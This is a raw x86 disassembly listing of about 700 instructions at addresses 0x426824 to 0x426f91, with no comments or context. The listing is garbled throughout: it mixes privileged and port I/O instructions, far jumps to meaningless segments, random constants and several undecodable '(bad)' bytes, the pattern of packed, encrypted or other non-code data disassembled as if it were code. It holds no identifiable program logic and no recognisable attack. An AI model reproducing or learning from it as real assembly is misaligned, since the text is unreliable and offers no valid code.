  426824:	push   ebp
  426826:	jno    0x4267e7
  426828:	ins    BYTE PTR es:[edi],dx
  426829:	ret    
  42682a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42682b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42682c:	push   ss
  42682d:	test   BYTE PTR [ecx+ecx*8-0x822a47b],cl
  426834:	clc    
  426835:	xor    ebp,edx
  426837:	outs   dx,BYTE PTR ds:[esi]
  426838:	call   0xd032684d
  42683d:	lock fwait
  42683f:	xor    edi,DWORD PTR [eax+0x58dfc7]
  426845:	mov    WORD PTR [edi],gs
  426847:	aam    0xb7
  426849:	dec    edx
  42684a:	mov    bl,0xb1
  42684c:	fs sub al,0xa1
  42684f:	jle    0x426820
  426851:	adc    eax,0x6317779c
  426856:	sbb    al,0x9
  426858:	(bad)
  42685b:	lds    ecx,FWORD PTR [esi]
  42685d:	std    
  42685e:	xchg   edx,eax
  42685f:	call   0x1bf1:0x5928f04a
  426866:	jl     0x426896
  426868:	shl    BYTE PTR [esi+0x46a7be9f],1
  42686e:	add    DWORD PTR [eax+0x0],ebx
  426871:	stc    
  426872:	mov    cl,0xe
  426874:	jl     0x42682d
  426876:	aad    0xf3
  426878:	pop    edi
  426879:	push   esi
  42687a:	pop    ds
  42687b:	adc    DWORD PTR [edx+0x2a3d030e],ebp
  426881:	cmp    bh,dh
  426883:	arpl   WORD PTR [ebx],ax
  426885:	xor    al,0xb5
  426887:	mov    fs,eax
  426889:	add    ch,BYTE PTR [ecx-0x66]
  42688c:	xor    BYTE PTR [edi+0x5c],bh
  42688f:	sbb    eax,esp
  426891:	iret   
  426892:	stos   DWORD PTR es:[edi],eax
  426893:	daa    
  426894:	addr16 int3 
  426896:	and    DWORD PTR [edi+0x14],eax
  426899:	not    DWORD PTR [edx+edx*1-0x1d]
  42689d:	cmp    al,0x8f
  42689f:	pop    ebp
  4268a0:	test   al,0x7e
  4268a2:	xlat   BYTE PTR ds:[ebx]
  4268a3:	push   0xd72f8d7a
  4268a8:	sub    eax,0xe177e8dc
  4268ad:	mov    ds:0x8dd9e73d,al
  4268b2:	inc    DWORD PTR [esi]
  4268b4:	add    cl,BYTE PTR [esi-0x4a96359a]
  4268ba:	ror    BYTE PTR [ebx],cl
  4268bc:	xchg   BYTE PTR [ebx],ah
  4268be:	outs   dx,DWORD PTR ds:[esi]
  4268bf:	push   0x66
  4268c1:	adc    bh,BYTE PTR [edx-0x378f3111]
  4268c7:	adc    edx,DWORD PTR [eax-0x77]
  4268ca:	cmp    DWORD PTR [esi],0xa5e4512c
  4268d0:	and    ch,dh
  4268d2:	add    ebx,DWORD PTR [edx-0x6a]
  4268d5:	adc    DWORD PTR [edx],eax
  4268d7:	lods   eax,DWORD PTR ds:[esi]
  4268d8:	addr16 sub eax,0xe8161eed
  4268de:	xchg   ebx,eax
  4268df:	vpcomd xmm2,xmm5,xmm4,0x90
  4268e5:	sbb    BYTE PTR [edx+0x591d233c],al
  4268eb:	dec    edi
  4268ec:	dec    BYTE PTR ds:0xa9ec2a01
  4268f2:	lahf   
  4268f3:	xor    DWORD PTR [ecx-0x4e6993a3],edx
  4268f9:	xchg   ebx,ecx
  4268fb:	inc    esp
  4268fc:	shl    dl,0x35
  4268ff:	es int 0xd4
  426902:	jmp    0x426938
  426904:	test   al,0x62
  426906:	push   0xffffffd7
  426908:	or     eax,ebp
  42690a:	in     eax,0x23
  42690c:	jo     0x4268b8
  42690e:	push   ds
  42690f:	sbb    BYTE PTR [ebx],cl
  426911:	add    ebx,edi
  426913:	inc    ebp
  426914:	cmc    
  426915:	jg     0x4268c3
  426917:	loope  0x4268e4
  426919:	out    dx,eax
  42691a:	fwait
  42691b:	and    eax,0x2a3f57b3
  426920:	sbb    dl,BYTE PTR [esi]
  426922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426923:	rol    bh,0x1d
  426926:	lods   al,BYTE PTR ds:[esi]
  426927:	(bad)  
  426928:	repz add al,0x28
  42692b:	mov    cl,0x9a
  42692d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42692f:	inc    ebx
  426930:	pop    edx
  426931:	pop    eax
  426932:	and    ch,BYTE PTR [esi-0x2b9ec7d3]
  426938:	or     DWORD PTR [ecx],edi
  42693a:	inc    ebp
  42693b:	jnp    0x4268bd
  42693d:	imul   esi,ecx,0x1bc93c8e
  426943:	fucomi st,st(1)
  426945:	xor    eax,0xd88b2609
  42694a:	ja     0x4268f2
  42694c:	xlat   BYTE PTR ds:[ebx]
  42694d:	lds    esp,FWORD PTR [ebp+0xa1d0ffa]
  426953:	lock sub esp,ebx
  426956:	enter  0x563c,0xcb
  42695a:	lahf   
  42695b:	or     BYTE PTR ds:0x220d6b15,dl
  426961:	rcl    DWORD PTR [eax+ebp*8],1
  426964:	adc    eax,0x40e4943b
  426969:	jb     0x4269bb
  42696b:	xor    edi,DWORD PTR [esi]
  42696d:	stc    
  42696e:	mov    bh,0xc2
  426970:	add    BYTE PTR [eax+0x539282ad],bh
  426976:	das    
  426977:	adc    ecx,DWORD PTR [ebx-0x45]
  42697a:	push   esp
  42697b:	jecxz  0x42698f
  42697d:	scas   eax,DWORD PTR es:[edi]
  42697e:	in     eax,0x16
  426980:	push   ecx
  426981:	dec    edi
  426982:	dec    edi
  426983:	push   ds
  426984:	cmp    DWORD PTR [esi],ecx
  426986:	stc    
  426987:	mov    WORD PTR [edi],es
  426989:	add    eax,DWORD PTR [ebx-0x779a81fe]
  42698f:	cli    
  426990:	inc    ebx
  426991:	sub    al,0xec
  426993:	imul   BYTE PTR [eax]
  426995:	outs   dx,BYTE PTR ds:[esi]
  426996:	push   esi
  426997:	dec    esi
  426998:	je     0x4269ef
  42699a:	aam    0x54
  42699c:	xchg   edx,eax
  42699d:	xchg   esi,eax
  42699e:	push   eax
  42699f:	and    DWORD PTR [edi-0x10],esp
  4269a2:	ins    BYTE PTR es:[edi],dx
  4269a3:	mov    ds,WORD PTR [ecx+0x55]
  4269a6:	mov    cl,0x33
  4269a8:	jecxz  0x4269aa
  4269aa:	pop    edi
  4269ab:	and    eax,0x637853d6
  4269b0:	into   
  4269b1:	push   ecx
  4269b2:	xlat   BYTE PTR ds:[ebx]
  4269b3:	jns    0x4269bd
  4269b5:	adc    DWORD PTR [edi+ebx*4],0xffffff8b
  4269b9:	add    al,0x7b
  4269bb:	in     eax,dx
  4269bc:	add    ebx,DWORD PTR [edx]
  4269be:	add    DWORD PTR [ebx+0x51101184],ebx
  4269c4:	push   ss
  4269c5:	mov    ecx,0xad1954f7
  4269ca:	mov    eax,ds:0xe13212c0
  4269cf:	ffreep st(3)
  4269d1:	icebp  
  4269d2:	dec    ebx
  4269d3:	ins    WORD PTR es:[edi],dx
  4269d5:	sahf   
  4269d6:	dec    edi
  4269d7:	add    BYTE PTR [ecx-0x73],bl
  4269da:	repz fimul WORD PTR [eax]
  4269dd:	adc    ch,bh
  4269df:	pop    ecx
  4269e0:	repnz and bl,dh
  4269e3:	inc    esp
  4269e4:	dec    eax
  4269e5:	push   esp
  4269e6:	cmp    al,0x6c
  4269e8:	lea    edx,[ebp-0x11ff3c5d]
  4269ee:	call   0xe552001d
  4269f3:	jecxz  0x426a20
  4269f5:	jne    0x4269bf
  4269f7:	add    BYTE PTR [ecx-0x64],dl
  4269fa:	ret    
  4269fb:	ins    BYTE PTR es:[edi],dx
  4269fc:	cs inc edx
  4269fe:	or     eax,0x31b482db
  426a03:	add    ebx,edx
  426a05:	hlt    
  426a06:	xor    ebp,DWORD PTR [eax-0x60]
  426a09:	and    BYTE PTR [edi-0x2f],dh
  426a0c:	inc    eax
  426a0d:	xor    al,0xc
  426a0f:	test   BYTE PTR [edx-0x78834e63],bl
  426a15:	aam    0xed
  426a17:	inc    esp
  426a18:	aam    0xe4
  426a1a:	mov    edi,0xad1f5f79
  426a1f:	sbb    DWORD PTR [edi],edi
  426a21:	jle    0x4269e1
  426a23:	call   0xae6ea296
  426a28:	or     ch,BYTE PTR [ebp-0x62]
  426a2b:	ficom  WORD PTR [esi+0x167293]
  426a31:	or     DWORD PTR ds:0x6e6fcd3b,0x58
  426a38:	sti    
  426a39:	xlat   BYTE PTR ds:[ebx]
  426a3a:	mov    cl,0x3c
  426a3c:	popa   
  426a3d:	fwait
  426a3e:	dec    ecx
  426a3f:	mov    ds:0xd3fa0000,eax
  426a44:	adc    eax,0xfac73d07
  426a49:	push   DWORD PTR ds:0xc91c7bfe
  426a4f:	mov    al,0x21
  426a51:	xchg   esp,eax
  426a52:	stos   BYTE PTR es:[edi],al
  426a53:	fadd   QWORD PTR [ecx]
  426a55:	add    BYTE PTR [esi],ah
  426a57:	add    eax,DWORD PTR [eax]
  426a59:	add    dh,bh
  426a5b:	dec    esp
  426a5c:	jnp    0x426a7d
  426a5e:	ret    0x243c
  426a61:	push   es
  426a62:	add    dh,BYTE PTR [edi-0x3c]
  426a65:	daa    
  426a66:	jmp    0x6806:0xdb521970
  426a6d:	push   edx
  426a6e:	xchg   ecx,eax
  426a6f:	ror    dl,1
  426a71:	push   ebx
  426a72:	clc    
  426a73:	mov    edx,0xeca1b600
  426a78:	imul   DWORD PTR [ebx-0x2b]
  426a7b:	cmp    DWORD PTR [eax-0x65],edx
  426a7e:	shl    DWORD PTR [esi+0x330559cf],1
  426a84:	mov    dl,0xa4
  426a86:	adc    cl,ah
  426a88:	les    esp,FWORD PTR [eax]
  426a8a:	loop   0x426a8c
  426a8c:	lahf   
  426a8d:	imul   ebp,DWORD PTR ss:[ebp-0x2d12f061],0x2677baaf
  426a98:	add    bh,ah
  426a9a:	fwait
  426a9b:	stos   DWORD PTR es:[edi],eax
  426a9c:	pop    ebx
  426a9d:	je     0x426ac2
  426a9f:	stos   BYTE PTR es:[edi],al
  426aa0:	shl    DWORD PTR [esi],cl
  426aa2:	jge    0x426b14
  426aa4:	mov    BYTE PTR [ecx+ebp*4],0xbf
  426aa8:	pop    eax
  426aa9:	sub    DWORD PTR [ebx],0x60016fb0
  426aaf:	xchg   ebp,eax
  426ab0:	jmp    DWORD PTR [ebx-0x53e0a25c]
  426ab6:	sub    ebx,edi
  426ab8:	test   eax,0x332fcee5
  426abd:	imul   esp,ebx,0x39d12830
  426ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ac4:	mov    ecx,0x49b8445
  426ac9:	sti    
  426aca:	pop    ss
  426acb:	dec    esi
  426acc:	pop    esp
  426acd:	aam    0x8
  426acf:	add    dh,BYTE PTR [edi-0x6d]
  426ad2:	loope  0x426a5f
  426ad4:	mov    edx,eax
  426ad6:	mov    bl,0x8c
  426ad8:	ret    
  426ad9:	push   ss
  426ada:	or     BYTE PTR [esi],0x6d
  426add:	addr16 pop eax
  426adf:	jno    0x426a83
  426ae1:	lock xchg ebp,eax
  426ae3:	cmp    dl,BYTE PTR [eax]
  426ae5:	dec    edx
  426ae6:	frstor [edx+ebp*1-0x69]
  426aea:	sbb    eax,0x81c633cd
  426aef:	and    ebx,eax
  426af1:	mov    ds:0x558ac004,eax
  426af6:	in     al,0x85
  426af8:	(bad)  
  426af9:	jb     0x426b2f
  426afb:	mov    eax,ds:0x88f2c4d9
  426b00:	and    al,0x45
  426b02:	adc    al,0xc0
  426b04:	jmp    0xcb87:0xcba224a9
  426b0b:	clc    
  426b0c:	mov    esp,DWORD PTR [eax+0x6a]
  426b0f:	push   ds
  426b10:	and    ebx,DWORD PTR [edx+ecx*2-0x4863a33e]
  426b17:	push   0x61
  426b19:	push   cs
  426b1a:	or     al,0xc5
  426b1c:	xlat   BYTE PTR ds:[ebx]
  426b1d:	adc    BYTE PTR [eax],al
  426b1f:	adc    al,0xb4
  426b21:	push   es
  426b22:	sub    ebx,DWORD PTR [edx-0x52978141]
  426b28:	retf   0x7c04
  426b2b:	pop    ss
  426b2c:	mov    esi,0x2b842c0
  426b31:	retf   
  426b32:	ins    BYTE PTR es:[edi],dx
  426b33:	xor    edx,ebx
  426b35:	or     esi,esi
  426b37:	jecxz  0x426b6f
  426b39:	mov    cl,0x4d
  426b3b:	mov    ds:0x428488,al
  426b40:	sub    al,0xd6
  426b42:	ins    DWORD PTR es:[edi],dx
  426b43:	(bad)  
  426b45:	mov    esi,0xa60a9a7d
  426b4a:	mov    bh,0x22
  426b4c:	fstp   TBYTE PTR [edx+0x7f]
  426b4f:	cmp    eax,0xd23f550f
  426b54:	dec    edx
  426b55:	pushf  
  426b56:	mov    dh,ch
  426b58:	aaa    
  426b59:	mov    BYTE PTR [ebx+0x9],bl
  426b5c:	mov    al,0x10
  426b5e:	(bad)  
  426b5f:	cdq    
  426b60:	fimul  DWORD PTR [ebp+0x305c3d05]
  426b66:	or     al,0x2d
  426b68:	jge    0x426b41
  426b6a:	push   es
  426b6b:	sub    eax,0xa5a4a348
  426b70:	das    
  426b71:	sub    DWORD PTR [esi-0x6c],0x72
  426b75:	xor    cl,al
  426b77:	mov    es,WORD PTR [ebx-0x207b93d6]
  426b7d:	enter  0x9a85,0x98
  426b81:	ret    0xad5a
  426b84:	and    ah,dl
  426b86:	not    DWORD PTR [edx+eiz*8-0x5a]
  426b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b8b:	xor    al,0xa7
  426b8d:	jo     0x426bde
  426b8f:	sub    al,0xb6
  426b91:	jnp    0x426c00
  426b93:	test   al,0xde
  426b95:	pop    edi
  426b96:	imul   ebx,DWORD PTR [ebp+0xf02dcb2],0x2a428226
  426ba0:	pusha  
  426ba1:	fst    DWORD PTR [ebx+0x5d]
  426ba4:	ret    0x7267
  426ba7:	scas   eax,DWORD PTR es:[edi]
  426ba8:	and    BYTE PTR [edi],al
  426baa:	popf   
  426bab:	xchg   DWORD PTR [edi+0x11774f64],ecx
  426bb1:	scas   al,BYTE PTR es:[edi]
  426bb2:	push   eax
  426bb3:	sub    al,BYTE PTR [ebx]
  426bb5:	rcl    DWORD PTR [ecx+0x79],0x7f
  426bb9:	vpcmpgtd xmm4,xmm1,XMMWORD PTR [ecx-0x1b]
  426bbe:	dec    esi
  426bbf:	scas   eax,DWORD PTR es:[edi]
  426bc0:	cmp    BYTE PTR [ebx+0xd35c5c4],cl
  426bc6:	push   edi
  426bc7:	mov    ebx,0xd0522a1b
  426bcc:	call   0x7ac5:0xeac45ad8
  426bd3:	mov    dh,0xe9
  426bd5:	adc    eax,0x60c77c16
  426bda:	push   edi
  426bdb:	push   es
  426bdc:	movaps xmm4,XMMWORD PTR [esi+0x16]
  426be0:	mov    ds:0x6b94a550,eax
  426be5:	dec    edx
  426be6:	icebp  
  426be7:	xor    edx,DWORD PTR [esi+ebx*4-0x42]
  426beb:	add    edi,DWORD PTR [ebp+0x44850a56]
  426bf1:	sub    dl,BYTE PTR [edx+0x63a917a6]
  426bf7:	inc    DWORD PTR [ecx]
  426bf9:	xor    al,0xf3
  426bfb:	idiv   BYTE PTR [ecx-0x1a]
  426bfe:	inc    BYTE PTR [eax+eax*8+0x16e13a42]
  426c05:	adc    DWORD PTR [eax],edx
  426c07:	pop    ds
  426c08:	cwde   
  426c09:	add    al,0x8f
  426c0b:	cwde   
  426c0c:	(bad)
  426c10:	lods   eax,DWORD PTR fs:[esi]
  426c12:	sbb    al,0x34
  426c14:	fs and al,0xfe
  426c17:	aam    0x57
  426c19:	sbb    BYTE PTR [ecx],0x5d
  426c1c:	xor    BYTE PTR [esi],ch
  426c1e:	inc    edi
  426c1f:	pushf  
  426c20:	and    BYTE PTR [ecx+0x6e1eefd5],bl
  426c26:	pop    ebx
  426c27:	js     0x426c78
  426c29:	js     0x426c13
  426c2b:	fnstsw WORD PTR [ebx+0x2fdbeac8]
  426c31:	add    bl,al
  426c33:	pop    ebp
  426c34:	daa    
  426c35:	inc    edx
  426c36:	imul   ebp,esi,0x91adaecf
  426c3c:	adc    al,0x67
  426c3e:	push   0x21cdf8a6
  426c43:	sub    bl,dl
  426c45:	push   edx
  426c46:	mov    ds:0xfc9d68a5,al
  426c4b:	sbb    esp,edx
  426c4d:	xchg   ebp,eax
  426c4e:	stos   BYTE PTR es:[edi],al
  426c4f:	call   0x86b7:0x23d50e22
  426c56:	ror    DWORD PTR [esi],1
  426c58:	mov    es,edx
  426c5a:	sti    
  426c5b:	out    0x1b,eax
  426c5d:	retf   
  426c5e:	adc    bl,BYTE PTR [ecx-0x3995b77d]
  426c64:	mov    bh,0x69
  426c66:	out    dx,al
  426c67:	pusha  
  426c68:	lods   eax,DWORD PTR ds:[esi]
  426c69:	das    
  426c6a:	mov    ds:0x363f7a01,al
  426c6f:	div    esp
  426c71:	int    0x46
  426c73:	(bad)  
  426c75:	mov    DWORD PTR [ecx+0x6ea83bbc],ebp
  426c7b:	jns    0x426c31
  426c7d:	dec    esi
  426c7e:	fistp  QWORD PTR [eax-0x62]
  426c81:	xchg   ecx,eax
  426c82:	inc    esi
  426c83:	push   ss
  426c84:	jne    0x426cff
  426c86:	xor    bl,0x75
  426c89:	fdivr  QWORD PTR [ebx]
  426c8b:	add    ecx,0xb51eac3f
  426c91:	cwde   
  426c92:	cs and al,0xb0
  426c95:	pop    esp
  426c96:	daa    
  426c97:	jle    0x426c36
  426c99:	sbb    ch,BYTE PTR [ebp+0x4a]
  426c9c:	out    0xb2,eax
  426c9e:	xor    edx,DWORD PTR [eax]
  426ca0:	xor    DWORD PTR [ecx+0x1f2cf02b],ebx
  426ca6:	jo     0x426cc3
  426ca8:	xor    ch,BYTE PTR ds:0xa41eb1a5
  426cae:	push   ss
  426caf:	jge    0x426c64
  426cb1:	scas   al,BYTE PTR es:[edi]
  426cb2:	sub    al,BYTE PTR [ebx+0x3120978]
  426cb8:	mov    ah,0xfe
  426cba:	and    eax,0x847acb4f
  426cbf:	test   DWORD PTR [esi],esp
  426cc1:	push   esi
  426cc2:	cld    
  426cc3:	mov    dl,0x7e
  426cc5:	sub    esp,DWORD PTR [ebx]
  426cc7:	inc    ebx
  426cc8:	addr16 aad 0x2b
  426ccb:	push   eax
  426ccc:	scas   al,BYTE PTR es:[edi]
  426ccd:	xchg   ebp,eax
  426cce:	arpl   WORD PTR [ebx+edx*2],sp
  426cd1:	push   eax
  426cd2:	std    
  426cd3:	and    DWORD PTR [edx-0x7c],0xc54d350f
  426cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cdb:	add    ch,BYTE PTR [ecx-0xf]
  426cde:	adc    BYTE PTR [edx-0x11eff780],0x37
  426ce5:	mov    ds,WORD PTR [esi]
  426ce7:	outs   dx,BYTE PTR ds:[esi]
  426ce8:	loopne 0x426d32
  426cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ceb:	pop    ebp
  426cec:	push   ds
  426ced:	pop    esi
  426cee:	mov    DWORD PTR [eax+0x6cf57dd8],edx
  426cf4:	rol    BYTE PTR [edi+eax*1+0x4c4f8511],0x8f
  426cfc:	and    DWORD PTR [edi+0x2207df2d],edi
  426d02:	cli    
  426d03:	scas   al,BYTE PTR es:[edi]
  426d04:	(bad)  
  426d06:	outs   dx,DWORD PTR ds:[esi]
  426d07:	xchg   edx,eax
  426d08:	xchg   ecx,eax
  426d09:	xor    edx,ebx
  426d0b:	add    DWORD PTR [ebx],ebp
  426d0d:	xchg   ebx,eax
  426d0e:	cmp    DWORD PTR [edx],esi
  426d10:	xchg   ecx,eax
  426d11:	es mov dh,0x90
  426d14:	xchg   BYTE PTR [edx+0x2c2188cd],ch
  426d1a:	in     al,dx
  426d1b:	inc    ecx
  426d1c:	mov    ebx,0x8d97f63c
  426d21:	in     al,dx
  426d22:	cdq    
  426d23:	sub    al,0x7e
  426d25:	enter  0xc0f9,0x3c
  426d29:	sbb    DWORD PTR [edx-0x57],0x30
  426d2d:	loope  0x426cf0
  426d2f:	int3   
  426d30:	ja     0x426d75
  426d32:	or     DWORD PTR [ebx-0x21],edx
  426d35:	jp     0x426db4
  426d37:	test   BYTE PTR [edx],cl
  426d39:	mov    ds:0xd5a123b0,al
  426d3e:	out    0x71,al
  426d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d41:	jo     0x426cfd
  426d43:	inc    esp
  426d44:	or     ebp,DWORD PTR [esi-0x590b4fa5]
  426d4a:	pop    ds
  426d4b:	(bad)  
  426d4c:	int3   
  426d4d:	jnp    0x426d5b
  426d4f:	pop    eax
  426d50:	and    BYTE PTR [ebx+0x34ec3156],dh
  426d56:	dec    edi
  426d57:	mov    edx,0x2243554
  426d5c:	jp     0x426d4f
  426d5e:	mov    eax,ds:0xec68199b
  426d63:	cmp    bh,BYTE PTR [ebx+0x1b]
  426d66:	fist   DWORD PTR [eax-0x77]
  426d69:	jnp    0x426d5a
  426d6b:	pop    edx
  426d6c:	add    BYTE PTR ds:0x6949de6,0x60
  426d73:	xchg   esi,eax
  426d74:	out    dx,al
  426d75:	mov    cl,0x2f
  426d77:	loop   0x426d8b
  426d79:	shl    DWORD PTR [edi],1
  426d7b:	test   eax,0x62dc990c
  426d80:	add    BYTE PTR [eax],al
  426d82:	iret   
  426d83:	neg    BYTE PTR [ebp-0x308442b0]
  426d89:	(bad)  
  426d8a:	out    dx,eax
  426d8b:	lods   al,BYTE PTR ds:[esi]
  426d8c:	(bad)  
  426d8d:	push   ss
  426d8e:	not    DWORD PTR [ecx]
  426d90:	mov    bl,0x69
  426d92:	rcr    bh,1
  426d94:	add    DWORD PTR [eax],eax
  426d96:	add    eax,DWORD PTR es:[eax]
  426d99:	add    BYTE PTR [esi],cl
  426d9b:	cli    
  426d9c:	dec    DWORD PTR [esi-0x65cf408e]
  426da2:	cmp    ecx,ebp
  426da4:	sub    DWORD PTR [eax],esp
  426da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426da7:	inc    esp
  426da8:	mov    eax,ds:0x117a49a2
  426dad:	sub    BYTE PTR [edi],dh
  426daf:	lods   eax,DWORD PTR ds:[esi]
  426db0:	scas   al,BYTE PTR es:[edi]
  426db1:	jecxz  0x426dd0
  426db3:	ror    DWORD PTR [eax+0x58],1
  426db6:	pop    edx
  426db7:	add    al,BYTE PTR [ebp+edi*4+0x7aebd89]
  426dbe:	xchg   edx,eax
  426dbf:	pusha  
  426dc0:	push   ebp
  426dc1:	adc    cl,BYTE PTR [edi+0x66]
  426dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dc5:	push   eax
  426dc6:	cmp    BYTE PTR [esi-0x2],dl
  426dc9:	ja     0x426e32
  426dcb:	pop    esp
  426dcc:	xor    bh,bl
  426dce:	adc    DWORD PTR [ecx+eiz*1-0x368c0419],esp
  426dd5:	xchg   edx,eax
  426dd6:	jne    0x426d80
  426dd8:	sbb    BYTE PTR [ebx],al
  426dda:	in     al,dx
  426ddb:	mov    ecx,0xf20cbc41
  426de0:	icebp  
  426de1:	xchg   esp,eax
  426de2:	shl    BYTE PTR [ebx+0x6e],1
  426de5:	jns    0x426d70
  426de7:	jbe    0x426d8c
  426de9:	test   BYTE PTR [esi],al
  426deb:	cmp    cl,BYTE PTR [ebp-0x69c3fcab]
  426df1:	jno    0x426e6b
  426df3:	xor    ebx,DWORD PTR [ecx-0x1b]
  426df6:	nop
  426df7:	popf   
  426df8:	into   
  426df9:	into   
  426dfa:	adc    eax,0x54e49ac6
  426dff:	enter  0x6c96,0xb9
  426e03:	int    0xbc
  426e05:	scas   al,BYTE PTR es:[edi]
  426e06:	or     ebp,esi
  426e08:	dec    ecx
  426e09:	pop    ss
  426e0a:	pop    edi
  426e0b:	dec    ecx
  426e0c:	pop    es
  426e0d:	xchg   edx,eax
  426e0e:	xchg   esp,eax
  426e0f:	popa   
  426e10:	loopne 0x426e5a
  426e12:	data16 xor ch,BYTE PTR [esi]
  426e15:	hlt    
  426e16:	inc    ecx
  426e17:	(bad)
  426e1a:	mov    al,0x42
  426e1c:	xchg   esp,eax
  426e1d:	stos   DWORD PTR es:[edi],eax
  426e1e:	xchg   ah,ah
  426e20:	jmp    0x4311:0x2dce0f59
  426e27:	clc    
  426e28:	scas   eax,DWORD PTR es:[edi]
  426e29:	das    
  426e2a:	sbb    eax,0x838ebf2c
  426e2f:	mov    gs,WORD PTR [edi+0x12bec6c4]
  426e35:	out    dx,eax
  426e36:	cmp    edi,eax
  426e38:	ja     0x426e3b
  426e3a:	fwait
  426e3b:	xor    al,0x7e
  426e3d:	out    dx,eax
  426e3e:	and    BYTE PTR [eax-0x5b],ch
  426e41:	push   0xcf86a369
  426e46:	je     0x426e54
  426e48:	not    BYTE PTR [eax-0x741f9c19]
  426e4e:	jle    0x426e40
  426e50:	pushf  
  426e51:	scas   al,BYTE PTR es:[edi]
  426e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e53:	and    dh,dh
  426e55:	lods   al,BYTE PTR ds:[esi]
  426e56:	jmp    0x426e3f
  426e58:	ficomp WORD PTR [esi]
  426e5a:	enter  0x2142,0x58
  426e5e:	and    eax,0x2149e9af
  426e63:	and    al,0xc9
  426e65:	mov    cl,0x80
  426e67:	and    eax,0x98b79415
  426e6c:	loope  0x426e69
  426e6e:	cmc    
  426e6f:	or     edx,esp
  426e71:	xchg   esp,eax
  426e72:	xor    eax,0xe6f9744e
  426e77:	mov    dh,0xc8
  426e79:	xor    al,BYTE PTR [edx]
  426e7b:	xor    DWORD PTR [esi-0x4],edx
  426e7e:	lock (bad) 
  426e81:	xchg   edi,eax
  426e82:	cmp    DWORD PTR [eax+0x4d],edi
  426e85:	dec    ebx
  426e86:	add    DWORD PTR ds:0x7a4b3b05,ecx
  426e8c:	out    0xd4,eax
  426e8e:	xor    BYTE PTR [edx-0x2cfc065b],0x3e
  426e95:	pushf  
  426e96:	pop    esi
  426e97:	pop    ecx
  426e98:	cmp    al,0x93
  426e9a:	hlt    
  426e9b:	punpcklwd mm4,DWORD PTR [edx]
  426e9e:	ss add eax,ebp
  426ea1:	jns    0x426e72
  426ea3:	fst    DWORD PTR [esi]
  426ea5:	stos   BYTE PTR es:[edi],al
  426ea6:	jae    0x426ed3
  426ea8:	out    0xe2,al
  426eaa:	xor    ebp,DWORD PTR [edx-0x5be5de76]
  426eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426eb1:	push   ecx
  426eb2:	mov    bl,0xfb
  426eb4:	jp     0x426ebf
  426eb6:	push   es
  426eb7:	pop    eax
  426eb8:	or     ebx,DWORD PTR [edx-0x2a73ada5]
  426ebe:	inc    ebx
  426ebf:	stc    
  426ec0:	dec    edi
  426ec1:	pop    esp
  426ec2:	fisttp QWORD PTR [edx+0x6a634bdf]
  426ec8:	jle    0x426f46
  426eca:	stos   DWORD PTR es:[edi],eax
  426ecb:	push   cs
  426ecc:	pop    edi
  426ecd:	adc    al,0xce
  426ecf:	test   DWORD PTR [edx],esi
  426ed1:	sub    DWORD PTR [esi],ebp
  426ed3:	ret    
  426ed4:	jo     0x426f3a
  426ed6:	add    eax,0x4f478f99
  426edb:	or     ebp,DWORD PTR [ecx+0x2b]
  426ede:	inc    ebx
  426edf:	fwait
  426ee0:	mov    al,ds:0x547b1d00
  426ee5:	sbb    al,0x9c
  426ee7:	jl     0x426ef6
  426ee9:	xor    al,0x1f
  426eeb:	ds dec edx
  426eed:	icebp  
  426eee:	clts   
  426ef0:	jmp    0x426eee
  426ef2:	jle    0x426e94
  426ef4:	inc    edi
  426ef5:	addr16 mov esp,0xb22b7d21
  426efb:	mov    WORD PTR [ecx-0x760807ec],es
  426f01:	push   cs
  426f02:	and    esi,ebp
  426f04:	das    
  426f05:	jnp    0x426f80
  426f07:	jl     0x426f54
  426f09:	adc    al,0x31
  426f0b:	in     al,0xd8
  426f0d:	mov    dl,0x8b
  426f0f:	aas    
  426f10:	ja     0x426ed6
  426f12:	int3   
  426f13:	lods   al,BYTE PTR ds:[esi]
  426f14:	cmp    ecx,DWORD PTR [edi+edx*4-0x46]
  426f18:	mov    esi,0xb88e6d2f
  426f1d:	dec    edi
  426f1e:	mov    edi,0x93e73c61
  426f23:	inc    eax
  426f24:	fwait
  426f25:	gs mov esi,0xb0f70799
  426f2b:	cmp    eax,0x8391990
  426f30:	cmc    
  426f31:	aas    
  426f32:	cdq    
  426f33:	push   eax
  426f34:	pop    eax
  426f35:	(bad)  
  426f36:	in     eax,0x3c
  426f38:	xlat   BYTE PTR ds:[ebx]
  426f39:	imul   edi,edi,0x77
  426f3c:	mov    bh,0x27
  426f3e:	test   al,0xb5
  426f40:	fs jmp 0x426f8c
  426f43:	add    ebx,DWORD PTR [eax]
  426f45:	clc    
  426f46:	aaa    
  426f47:	scas   eax,DWORD PTR es:[edi]
  426f48:	clc    
  426f49:	leave  
  426f4a:	test   esi,edx
  426f4c:	popf   
  426f4d:	ret    0x78cc
  426f50:	sub    al,0x2b
  426f52:	mov    ebp,0x89c6194d
  426f57:	inc    edx
  426f58:	fwait
  426f59:	iret   
  426f5a:	dec    esp
  426f5b:	xor    BYTE PTR [edx-0x4d],al
  426f5e:	sub    BYTE PTR [ebx+edi*1],dl
  426f61:	bound  edx,QWORD PTR [edi+0xb]
  426f64:	xchg   esi,eax
  426f65:	shr    BYTE PTR [edi+0x973382f],cl
  426f6b:	mov    ds:0x80552669,al
  426f70:	push   0xd7a4b044
  426f75:	inc    eax
  426f76:	adc    BYTE PTR [ebp-0x16],ah
  426f79:	jge    0x426efd
  426f7b:	push   edi
  426f7c:	push   0xd853c021
  426f81:	dec    eax
  426f82:	mov    eax,esi
  426f84:	mov    ebp,0x704de4c7
  426f89:	xchg   esi,esp
  426f8b:	mov    eax,0xc6b720a9
  426f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
